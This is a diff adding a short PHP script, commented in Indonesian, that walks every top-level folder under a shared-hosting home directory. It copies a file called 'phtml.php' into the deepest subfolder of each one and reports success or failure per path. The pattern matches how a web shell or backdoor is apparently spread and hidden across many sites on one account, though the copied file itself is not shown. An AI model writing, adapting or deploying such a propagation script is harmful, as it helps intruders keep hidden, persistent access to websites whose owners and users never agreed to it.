@@ -1,0 +1,50 @@
+<?php
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+$root_path = '/home2/sc1hdvk5332/';
+$file_sumber = 'phtml.php';
+
+if (!file_exists($file_sumber)) {
+    die("File sumber tidak ditemukan!");
+}
+
+// Fungsi mencari folder terdalam
+function get_deepest_folder($base_dir) {
+    $deepest = $base_dir;
+
+    $dirs = glob($base_dir . '/*', GLOB_ONLYDIR);
+    if (empty($dirs)) {
+        return $base_dir; // tidak ada subfolder → ini yang terdalam
+    }
+
+    foreach ($dirs as $dir) {
+        $sub = get_deepest_folder($dir);
+        // pilih path paling panjang sebagai "terdalam"
+        if (strlen($sub) > strlen($deepest)) {
+            $deepest = $sub;
+        }
+    }
+
+    return $deepest;
+}
+
+// Ambil semua folder level pertama di root_path
+$folders = glob($root_path . '*', GLOB_ONLYDIR);
+
+foreach ($folders as $folder) {
+
+    // cari folder terdalam dalam struktur folder tersebut
+    $deepest = get_deepest_folder($folder);
+
+    // file tujuan
+    $file_tujuan = $deepest . '/' . basename($file_sumber);
+
+    if (copy($file_sumber, $file_tujuan)) {
+        echo "OK → $file_tujuan<br>";
+    } else {
+        echo "GAGAL → $file_tujuan<br>";
+    }
+}
+
+echo "<br>SELESAI.";
